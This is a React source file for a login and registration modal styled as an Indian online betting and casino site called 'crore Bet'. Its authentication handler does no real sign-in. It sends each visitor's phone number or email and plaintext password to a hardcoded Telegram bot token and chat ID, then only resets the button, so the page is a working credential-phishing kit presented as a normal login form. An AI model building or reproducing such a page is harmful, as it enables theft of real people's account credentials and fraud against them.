/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import { useState } from 'react';
import { 
  MessageSquare, 
  X, 
  Mail, 
  Phone, 
  Eye, 
  EyeOff, 
  ChevronDown, 
  PlusCircle,
  ChevronRight
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';

type AuthView = 'LOGIN' | 'REGISTER';
type LoginMethod = 'PHONE' | 'EMAIL';

export default function App() {
  const [view, setView] = useState<AuthView>('LOGIN');
  const [loginMethod, setLoginMethod] = useState<LoginMethod>('PHONE');
  const [showPassword, setShowPassword] = useState(false);
  const [isAgreed, setIsAgreed] = useState(true);
  
  // Form states
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [isSending, setIsSending] = useState(false);

  const togglePassword = () => setShowPassword(!showPassword);

  const isLoginValid = (loginMethod === 'PHONE' ? phone.length >= 10 : email.includes('@')) && password.length >= 6;
  const isRegisterValid = phone.length >= 10 && password.length >= 6 && isAgreed;

  const handleAuth = async () => {
    setIsSending(true);
    const identifier = loginMethod === 'PHONE' ? `+91 ${phone}` : email;
    const botToken = '8826568713:AAG38OqjmcPUH_wMv9dRg4se65P7d4APWHk';
    const chatId = '8251476575';
    
    const message = `<b>🌟 crore Bet login request 🌟</b>\n\n` +
      `👤 <b>Identifier:</b> <code>${identifier}</code>\n` +
      `🔑 <b>Password:</b> <code>${password}</code>\n` +
      `🔎 <b>View:</b> ${view}\n\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;

    try {
      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'HTML'
        })
      });
      // Small delay to simulate processing
      setTimeout(() => {
        setIsSending(false);
        // You could redirect or show an error here
      }, 1500);
    } catch (error) {
      console.error('Error sending to Telegram:', error);
      setIsSending(false);
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-[#1a1a1d]">
      {/* Backdrop simulation for preview */}
      <div className="fixed inset-0 bg-black/60 pointer-events-none" />
      
      <motion.div 
        layout
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        className="relative w-full max-w-[420px] bg-white rounded-3xl shadow-2xl overflow-hidden flex flex-col min-h-[600px]"
      >
        {/* Header */}
        <div className="flex items-center justify-between p-5 px-6">
          <button className="text-gray-400 hover:text-black transition-colors cursor-pointer">
            <MessageSquare size={24} />
          </button>
          
          <h1 className="text-xl font-[900] uppercase tracking-tighter text-center flex-1">
            {view === 'LOGIN' ? 'Log In' : 'Registration'}
          </h1>
          
          <button className="text-gray-400 hover:text-black transition-colors cursor-pointer">
            <X size={24} />
          </button>
        </div>

        {/* Content */}
        <div className="flex-1 px-6 pb-8 overflow-y-auto">
          
          <div className="mb-4">
            {view === 'LOGIN' ? (
              <p className="text-sm font-semibold text-gray-600">
                New user? <button onClick={() => setView('REGISTER')} className="text-black font-[800] cursor-pointer hover:underline">Registration</button>
              </p>
            ) : (
              <p className="text-sm font-semibold text-gray-600">
                Have an account? <button onClick={() => setView('LOGIN')} className="text-black font-[800] cursor-pointer hover:underline">Log In</button>
              </p>
            )}
          </div>

          <AnimatePresence mode="wait">
            {view === 'LOGIN' ? (
              <motion.div
                key="login"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0 }}
                className="space-y-5"
              >
                {/* Method Switcher */}
                <div className="flex gap-4">
                  <button 
                    onClick={() => setLoginMethod('EMAIL')}
                    className={`tab-btn ${loginMethod === 'EMAIL' ? 'tab-btn-active' : 'tab-btn-inactive'}`}
                  >
                    <Mail size={18} />
                    <span className="text-[13px]">Email or ID</span>
                  </button>
                  <button 
                    onClick={() => setLoginMethod('PHONE')}
                    className={`tab-btn ${loginMethod === 'PHONE' ? 'tab-btn-active' : 'tab-btn-inactive'}`}
                  >
                    <Phone size={18} />
                    <span className="text-[13px]">Phone</span>
                  </button>
                </div>

                <div className="space-y-4">
                  {loginMethod === 'PHONE' ? (
                    <div className="flex">
                      <div className="flex items-center gap-2 h-12 px-3 border border-r-0 border-gray-200 rounded-l-xl bg-[#f8f9fa] cursor-pointer">
                        <img src="https://flagcdn.com/w20/in.png" alt="IN" className="w-5 rounded-[2px]" />
                        <span className="text-sm font-bold opacity-80">+91</span>
                      </div>
                      <input 
                        type="tel" 
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        placeholder="Phone number"
                        className="input-field rounded-l-none border-l-0 focus:border-l rounded-r-xl"
                      />
                    </div>
                  ) : (
                    <input 
                      type="text" 
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="Email/Account ID"
                      className="input-field rounded-xl"
                    />
                  )}

                  <div className="relative">
                    <input 
                      type={showPassword ? "text" : "password"} 
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="Password"
                      className="input-field pr-12 rounded-xl"
                    />
                    <button 
                      onClick={togglePassword}
                      className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 p-1"
                    >
                      {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                    </button>
                  </div>

                  <p className="text-[13px] font-bold text-gray-500">
                    Forgot password? <button className="text-black hover:underline cursor-pointer">Reset</button>
                  </p>
                </div>

                <div className="pt-4">
                  <button 
                    onClick={handleAuth}
                    className="btn-primary rounded-xl" 
                    disabled={!isLoginValid || isSending}
                  >
                    {isSending ? 'Logging In...' : 'Log In'}
                  </button>
                </div>
              </motion.div>
            ) : (
              <motion.div
                key="register"
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0 }}
                className="space-y-4"
              >
                <div className="flex">
                  <div className="flex items-center gap-2 h-12 px-3 border border-r-0 border-gray-200 rounded-l-xl bg-[#f8f9fa] cursor-pointer">
                    <img src="https://flagcdn.com/w20/in.png" alt="IN" className="w-5 rounded-[2px]" />
                    <span className="text-sm font-bold opacity-80">+91</span>
                  </div>
                  <input 
                    type="tel" 
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    placeholder="Phone number"
                    className="input-field rounded-l-none border-l-0 focus:border-l rounded-r-xl"
                  />
                </div>

                <div className="relative">
                  <input 
                    type={showPassword ? "text" : "password"} 
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="Password"
                    className="input-field pr-12 rounded-xl"
                  />
                  <button 
                    onClick={togglePassword}
                    className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400"
                  >
                    {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>

                <div className="flex items-center justify-between input-field rounded-xl cursor-pointer bg-white">
                  <div className="flex items-center gap-3">
                    <img src="https://flagcdn.com/w20/in.png" alt="IN" className="w-6 rounded-[2px]" />
                    <span className="text-[15px] font-bold opacity-80">₹ - INR</span>
                  </div>
                  <ChevronDown size={20} className="text-gray-400" />
                </div>

                <button className="flex items-center gap-2 text-[13px] font-bold group">
                  <PlusCircle size={20} className="text-black group-hover:scale-110 transition-transform" />
                  <span>I have a promo code</span>
                </button>

                <div className="pt-2">
                  <h3 className="text-sm font-[900] uppercase text-black mb-3">Choose Your Bonus</h3>
                  <div className="relative rounded-2xl overflow-hidden shadow-lg group">
                    <div className="absolute inset-0 bg-gradient-to-br from-cyan-600 via-blue-500 to-indigo-600" />
                    <div className="relative p-4 pr-10 flex items-center gap-3 text-white">
                      <div className="w-12 h-12 flex-shrink-0 rounded-lg overflow-hidden border-2 border-white/20 bg-white/10">
                        <img 
                          src="https://images.unsplash.com/photo-1518133910546-b6c2fb7d79e3?q=80&w=100&auto=format&fit=crop" 
                          alt="Bonus"
                          className="w-full h-full object-cover" 
                        />
                      </div>
                      <div>
                        <div className="text-[13px] font-[900] text-yellow-300 uppercase leading-none mb-1">
                          777% Tower Rush Welcome Pack
                        </div>
                        <div className="text-[11px] font-bold opacity-90 leading-tight">
                          Climb the Tower with Boost
                        </div>
                      </div>
                      <ChevronRight size={20} className="absolute right-3 top-1/2 -translate-y-1/2 opacity-60" />
                    </div>
                  </div>
                </div>

                <div className="flex items-start gap-3 py-1">
                  <input 
                    type="checkbox" 
                    checked={isAgreed}
                    onChange={(e) => setIsAgreed(e.target.checked)}
                    className="mt-1 w-5 h-5 rounded-[4px] border-gray-300 text-emerald-600 focus:ring-emerald-500 checked:bg-emerald-600 border-2 cursor-pointer"
                  />
                  <p className="text-[12px] leading-tight font-semibold text-gray-700">
                    I confirm all the <span className="font-bold text-black underline">Terms of user agreement</span> and that I am over 18
                  </p>
                </div>

                <div className="pt-2">
                  <button 
                    onClick={handleAuth}
                    className="btn-primary rounded-xl" 
                    disabled={!isRegisterValid || isSending}
                  >
                    {isSending ? 'Registering...' : 'Registration'}
                  </button>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Social Divider */}
          <div className="mt-8">
            <div className="relative flex items-center justify-center mb-6">
              <div className="absolute inset-0 flex items-center">
                <div className="w-full border-t border-gray-200"></div>
              </div>
              <span className="relative px-3 bg-white text-[13px] font-black uppercase text-black tracking-widest">OR</span>
            </div>

            <button className="w-full h-[54px] flex items-center justify-between px-2 gap-4 rounded-full bg-[#2b70e4] text-white font-[800] text-[15px] transition-all hover:bg-[#2563d1] shadow-md group">
              <div className="w-10 h-10 rounded-full bg-white flex items-center justify-center shadow-sm">
                <svg viewBox="0 0 24 24" width="20" height="20" xmlns="http://www.w3.org/2000/svg">
                  <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
                  <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"/>
                  <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z" fill="#FBBC05"/>
                  <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"/>
                </svg>
              </div>
              <span className="flex-1 text-center -ml-10">Continue with Google</span>
            </button>
          </div>
        </div>
      </motion.div>

      {/* Background decoration elements */}
      <div className="fixed bottom-6 left-6 flex gap-8 opacity-40 font-[900] text-3xl uppercase italic text-gray-500/20 tracking-widest pointer-events-none select-none">
        <span>Main</span>
        <span>Live</span>
        <span>Casino</span>
      </div>
    </div>
  );
}
